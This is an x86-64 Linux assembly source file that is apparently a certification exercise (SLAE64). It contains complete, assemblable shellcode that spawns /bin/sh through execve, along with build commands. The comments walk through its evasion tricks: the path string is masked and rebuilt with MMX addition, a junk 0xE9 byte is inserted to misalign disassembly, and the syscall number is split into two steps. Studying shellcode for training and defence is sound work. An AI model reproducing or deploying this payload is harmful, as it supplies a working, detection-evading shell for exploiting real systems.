; This shellcode has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification :
; http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html
;
; Author : SLAE64-PA-6470 (kahlon81)
;
; $ nasm -f elf64 sc64.nasm -o sc64.o
; $ ld sc64.o -o sc64
;
; 64 bits system exec parameters : 
;
; %rax  System call  %rdi  %rsi  %rdx  %r10  %r8
; 0x3b  sys_execve  const char *filename   const char *const argv[]	const char *const envp[]

global _start
   
_start:
        ; /bin/sh in reverse order is hs/nib/ which is 0x68732f6e69622f in hexa
        ; Obfuscate this value with a simple addition
        ;  68 73 2f 6e 69 62 2f
        ; - 50 53 01 42 4a 50 02  X value
        ; = 18 20 2e 2c 1f 12 2d  Y value
	jmp begin+1	

begin: 
	db 0xe9			      ; E9 is opcode for jmp to disalign disassembly
	
        mov rcx, 0x505301424a5002   ; X value 
	movq mm0, rcx                 ; build the string value using MMX for obfuscation
	mov rcx, 0x18202e2c1f122d   ; Y value is padded
	movq mm1, rcx
	paddusb mm0, mm1            ; add mm0 with mm1 (parallel execution) and construct hs/nib/ 
	movq rcx, mm0
	emms                        ; return to FPU mode
	xor rdx, rdx                ; zero out rdx for an execve argument
	mov al, 0x30                ; move 0x30 (execve syscall is 0x3b) into al
	push rcx                    ; push the immediate value stored in rcx onto the stack
	lea rdi, [rsp]              ; load the address of the string that is on the stack into rdi
        add al, 0x0b		    ; move 0x3b into al (execve syscall)
	syscall                     ; make the syscall